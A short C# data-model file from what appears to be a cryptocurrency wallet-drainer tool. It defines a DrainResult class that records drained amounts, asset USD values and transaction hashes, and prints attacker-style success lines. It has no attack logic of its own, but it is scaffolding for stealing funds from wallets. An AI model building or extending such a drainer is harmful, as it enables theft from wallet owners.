namespace WalletDrainer.Models;

public sealed class DrainResult
{
    public bool Success { get; init; }
    public string? TransactionHash { get; init; }
    public string? ErrorMessage { get; init; }
    public decimal AmountDrained { get; init; }
    public WalletAsset? Asset { get; init; }
    public DateTime Timestamp { get; init; } = DateTime.UtcNow;

    public string Summary => Success
        ? $"[+] Drained {AmountDrained} {Asset?.Symbol} (${Asset?.UsdValue:F2}) TX: {TransactionHash}"
        : $"[-] Failed: {ErrorMessage}";
}
